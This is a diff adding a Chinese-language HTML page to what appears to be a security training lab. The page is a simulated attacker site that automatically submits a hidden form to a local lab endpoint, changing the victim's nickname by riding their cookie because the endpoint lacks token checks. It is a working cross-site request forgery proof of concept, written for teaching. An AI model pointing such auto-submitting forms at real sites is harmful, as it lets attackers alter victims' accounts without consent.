@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>攻击者页面 · CSRF PoC</title>
+  <link rel="stylesheet" href="/static/app.css">
+</head>
+<body>
+<main class="narrow">
+  <h2>攻击者页面（CSRF PoC）</h2>
+  <p class="alert">这是一个模拟第三方站点。真实攻击中它托管在完全不同的域名下。</p>
+  <p class="muted">
+    页面加载后会自动向 <code>http://127.0.0.1:8080/lab/csrf/profile</code> 提交表单。
+    浏览器会带上受害者在目标站点的 Cookie，而目标接口不校验 Token，于是请求被当成受害者本人发起。
+  </p>
+  <form id="poc" method="post" action="http://127.0.0.1:8080/lab/csrf/profile">
+    <input type="hidden" name="nickname" value="hacked-by-csrf">
+  </form>
+  <p class="mono">表单已就绪，若没有自动跳转，请手动点击下面的按钮。</p>
+  <button class="btn danger" type="submit" form="poc">手动提交</button>
+  <script nonce="{{.Nonce}}">
+    // 自动提交，模拟攻击者“零交互”触发
+    document.getElementById('poc').submit();
+  </script>
+  <p><a href="/lab/csrf">返回靶场说明</a></p>
+</main>
+</body>
+</html>
